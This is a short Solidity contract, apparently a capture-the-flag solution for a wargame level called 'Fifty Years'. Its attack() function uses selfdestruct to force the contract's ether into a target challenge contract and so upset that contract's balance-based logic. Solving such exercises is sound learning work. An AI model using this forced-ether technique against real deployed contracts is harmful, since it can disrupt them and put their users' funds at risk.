pragma solidity ^0.6.0;

contract FiftyYearsAttack {
    address payable challengeContractAddress;

    constructor(address payable _challengeContractAddress) public payable {
        challengeContractAddress = _challengeContractAddress;
    }

    function attack() external {
        selfdestruct(challengeContractAddress);
    }
}
